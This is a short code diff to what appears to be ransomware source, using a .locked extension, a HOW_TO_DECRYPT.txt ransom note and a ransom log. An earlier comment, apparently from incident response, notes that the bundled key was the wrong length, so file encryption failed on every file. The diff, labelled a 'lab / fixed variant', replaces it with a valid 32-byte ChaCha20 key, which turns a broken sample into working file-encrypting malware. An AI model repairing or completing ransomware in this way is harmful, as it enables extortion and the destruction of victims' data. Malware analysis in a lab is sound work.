@@ -29,10 +29,16 @@ except ImportError:
     print("Missing dependency. Install with: pip install pycryptodome")
     sys.exit(1)
 
-# NOTE (IR): this literal is 44 bytes. PyCryptodome ChaCha20 requires exactly 32.
-# As bundled, encrypt_file() raises ValueError on every file; notes are still dropped.
-# ENCRYPTION_KEY = b"X7k9mP2vQ8wR4tY6uI0oA3sD5fG7hJ1lZxCvBnMqWeRs"
-ENCRYPTION_KEY = b"X7k9mP2vQ8wR4tY6uI0oA3sD5fG7hJ1l"
+# Lab / fixed variant: ChaCha20 needs exactly 32 bytes.
+# Sample literal is 44 B (broken); here we use original[:32].
+# ENCRYPTION_KEY = b"X7k9mP2vQ8wR4tY6uI0oA3sD5fG7hJ1lZxCvBnMqWeRs"  # 44 B — fails
+# ENCRYPTION_KEY = bytes.fromhex(
+#     "8a3f02d97c41e65b09fd27b35e8814ca"
+#     "44601d9a73cf5208e1ab367bd04529fc"
+# )  # alternate random 32 B test key
+ENCRYPTION_KEY = bytes.fromhex(
+    "58376b396d50327651387752347459367549306f4133734435664737684a316c"
+)  # 32 B == b"X7k9mP2vQ8wR4tY6uI0oA3sD5fG7hJ1l"
 FILE_EXTENSION = ".locked"
 RANSOM_NOTE_NAME = "HOW_TO_DECRYPT.txt"
 LOG_FILE = os.path.join(os.getenv("APPDATA", ""), "ransom.log")
